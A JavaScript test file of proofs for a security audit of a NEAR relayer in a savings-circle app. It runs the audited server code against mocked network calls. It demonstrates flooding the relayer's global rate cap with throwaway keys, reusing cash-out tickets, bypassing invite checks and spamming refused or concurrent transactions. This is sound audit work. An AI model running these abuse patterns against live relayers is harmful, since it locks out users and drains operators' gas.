// Proofs for the relayer findings. Run from the a4 folder:
//   node --test proofs/relay-abuse.test.js
// No network: fetch is mocked. Imports the audited server code as-is.
import assert from "node:assert/strict";
import { test } from "node:test";

const APP = new URL("../contri/app/", import.meta.url);
const { signIntents, transfer, authCall } = await import(new URL("public/js/lib/intents.js", APP).href);
const { signerFromSeed } = await import(new URL("public/js/lib/keys.js", APP).href);
const { toBase58, randomBytes } = await import(new URL("public/js/lib/bytes.js", APP).href);
const { relay, checkPayload, paymentProblem } = await import(new URL("server/relay.js", APP).href);
const { issueTicket } = await import(new URL("server/ticket.js", APP).href);
const { keep } = await import(new URL("server/keeper.js", APP).href);

const TOKEN = "nep141:usdt.tether-token.near";
const relayerSeed = new Uint8Array(32).fill(9);
const relayerSigner = await signerFromSeed(relayerSeed);
const RELAYER_KEY = `ed25519:${toBase58(new Uint8Array([...relayerSeed, ...relayerSigner.publicKey]))}`;
const c = {
  network: "mainnet", rpcUrl: "http://rpc.test", contractId: "circles.contring.near", intentsId: "intents.near", tokenId: TOKEN,
  relayerId: "contring.near", relayerKey: RELAYER_KEY, oneClickUrl: "http://1click.test", oneClickKey: "k",
};

/** A fresh key nobody has ever funded: free to make, as many as wanted. */
const freshKey = () => signerFromSeed(randomBytes(32));

test("F1: zero-balance payloads from fresh keys use up the relayer's global 60/min cap before simulation, locking every member out", async () => {
  const real = globalThis.fetch;
  let rpcCalls = 0;
  let sent = 0;
  globalThis.fetch = /** @type {any} */ (async (_url, init) => {
    const body = JSON.parse(init.body);
    if (body.method === "send_tx") sent++;
    rpcCalls++;
    // simulate_intents for an account with no USDT: NEAR Intents refuses it.
    return new Response(JSON.stringify({ jsonrpc: "2.0", id: "contri", error: { name: "HANDLER_ERROR", cause: { name: "CONTRACT_EXECUTION_ERROR", info: "Smart contract panicked: insufficient balance or overflow" } } }));
  });
  try {
    // "create:" needs no chain lookup at all in the pre-checks.
    const msg = "create:1000000:2:600:join:-:spam";
    let rejectedBySimulation = 0;
    for (let i = 0; i < 60; i++) {
      const k = await freshKey();
      const signed = await signIntents(k, [transfer(c.contractId, TOKEN, 1_000_000n, { msg })]);
      await assert.rejects(relay({ signed: [signed] }, c), (e) => /NEAR Intents would reject this/.test(e.message));
      rejectedBySimulation++;
    }
    assert.equal(rejectedBySimulation, 60);
    assert.equal(sent, 0, "the attacker spent nothing and the relayer sent nothing");
    // Now a real member, with a real balance and a valid payment, is turned away.
    const member = await freshKey();
    const legit = await signIntents(member, [transfer(c.contractId, TOKEN, 1_000_000n, { msg: "create:1000000:3:86400:join:-:family" })]);
    await assert.rejects(relay({ signed: [legit] }, c), (e) => e.status === 429 && /Contri is busy/.test(e.message));
  } finally {
    globalThis.fetch = real;
  }
});

test("F2: a cash-out ticket is not bound to the signer, the amount or one use", async () => {
  const deposit = "a".repeat(64); // a 1Click deposit account, as /api/swap cashout returns
  const ticket = await issueTicket(c.relayerKey, deposit);
  for (let i = 0; i < 5; i++) {
    const stranger = await freshKey();
    // 1 unit = 0.000001 USDT, from an account the ticket was never issued to, again and again.
    const signed = await signIntents(stranger, [transfer(deposit, TOKEN, 1n), transfer(deposit, TOKEN, 1n)]);
    assert.equal(await checkPayload(signed, c, Date.now(), [ticket]), stranger.accountId);
  }
});

test("F3: the pre-check passes a join of an invite-only circle with no invite, which the contract refunds after the relayer paid gas", () => {
  const circle = { status: "Open", contribution: "1000000", size: 5, members: [{ account_id: "org" }], invite_only: true, organizer: "org" };
  assert.equal(paymentProblem("join:7", 1_000_000n, "attacker", circle), null);
  // and a join carrying any 128-hex junk as the invite signature
  assert.equal(paymentProblem(`join:7:${"0".repeat(128)}`, 1_000_000n, "attacker", circle), null);
});

test("F4: auth calls are checked only for membership, so a member can relay calls the contract will refuse, without limit across keys", async () => {
  const real = globalThis.fetch;
  globalThis.fetch = /** @type {any} */ (async (_url, init) => {
    const body = JSON.parse(init.body);
    const args = body.params?.args_base64 ? JSON.parse(Buffer.from(body.params.args_base64, "base64").toString()) : {};
    if (body.params?.method_name === "get_circle") {
      const result = [...Buffer.from(JSON.stringify({ id: args.circle_id, organizer: org.accountId, status: "Open", members: [{ account_id: org.accountId }], listings: [null, null] }))];
      return new Response(JSON.stringify({ jsonrpc: "2.0", id: "contri", result: { result } }));
    }
    return new Response(JSON.stringify({ jsonrpc: "2.0", id: "contri", error: { name: "X", cause: { name: "Y" } } }));
  });
  const org = await freshKey();
  try {
    // unlist a seat in an Open circle: the contract can only refuse it; the pre-check lets it through to simulation.
    const signed = await signIntents(org, [authCall(c.contractId, "unlist_seat:0:0"), authCall(c.contractId, "list_seat:0:1:1")]);
    // Past every pre-check: either simulation (run alone) or the global cap F1 already filled this minute (run after F1).
    await assert.rejects(relay({ signed: [signed] }, c), (e) => /NEAR Intents would reject this|Contri is busy/.test(e.message), "it got past the membership pre-check; on mainnet simulation passes auth calls and gas is spent");
  } finally {
    globalThis.fetch = real;
  }
});

test("F5: concurrent keeper calls for one circle each send a transaction (no single-flight, no global cap)", async () => {
  const real = globalThis.fetch;
  let sends = 0;
  const now = Date.now();
  const circle = { id: 3, status: "Active", paying: false, round_deadline: String(BigInt(now - 60_000) * 1_000_000n), members: [{ account_id: "x", paid_this_round: false }], backers: [] };
  globalThis.fetch = /** @type {any} */ (async (_url, init) => {
    const body = JSON.parse(init.body);
    const ok = (result) => new Response(JSON.stringify({ jsonrpc: "2.0", id: "contri", result }));
    if (body.method === "query" && body.params.request_type === "call_function") return ok({ result: [...Buffer.from(JSON.stringify(circle))] });
    if (body.method === "query" && body.params.request_type === "view_access_key") return ok({ nonce: 1, block_hash: toBase58(new Uint8Array(32).fill(1)) });
    if (body.method === "send_tx") {
      sends++;
      return ok({ status: { Failure: { ActionError: "round already settled" } }, transaction_outcome: { outcome: { logs: [] } }, receipts_outcome: [] });
    }
    return ok({});
  });
  try {
    const results = await Promise.all(Array.from({ length: 20 }, () => keep({ circle: 3 }, c, now)));
    assert.equal(sends, 20, "20 callers, 20 settle_round transactions, 19 of them can only fail on chain");
    assert.equal(results.length, 20);
  } finally {
    globalThis.fetch = real;
  }
});
